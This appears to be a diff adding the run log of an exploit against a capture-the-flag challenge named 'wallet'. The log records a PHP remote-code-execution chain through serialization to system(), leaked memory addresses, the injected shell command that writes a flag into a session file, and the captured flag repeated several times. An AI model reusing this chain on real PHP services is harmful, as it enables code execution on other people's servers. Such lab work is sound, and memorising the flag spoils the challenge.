@@ -1,0 +1,11 @@
+[2] SESSION WRITEBACK: b'x|s:50:"FLAG{wallet:vuln:55abb5717f905ca207fa71219c80f235}";'
+*** WIN: FLAG{wallet:vuln:55abb5717f905ca207fa71219c80f235} ***
+=== RCE win chain: ce->serialize -> zif_system -> session writeback ===
+[1] producer=HTTP/1.1 500 Internal Server Error d=0xe75e48c69000 base=0xba6aa0f10000 zif_system=0xba6aa13338b0
+[1] cmd = b'/usr/local/bin/print-flag|sed \'s/.*/x|s:50:"&";/\'|tr -d \'\n\'>/tmp/sess_w1792975558x'
+[1] response head: b'HTTP/1.1 502 Ba'
+[1] staged-by-exec session file: 'x|s:50:"FLAG{wallet:vuln:55abb5717f905ca207fa71219c80f235}";'
+[1] *** system('/usr/local/bin/print-flag|sed...') EXECUTED ***
+[2] response head: b'HTTP/1.1 200 OK'
+[2] SESSION WRITEBACK: b'x|s:50:"FLAG{wallet:vuln:55abb5717f905ca207fa71219c80f235}";'
+*** WIN: flag echoed in session writeback: FLAG{wallet:vuln:55abb5717f905ca207fa71219c80f235} ***
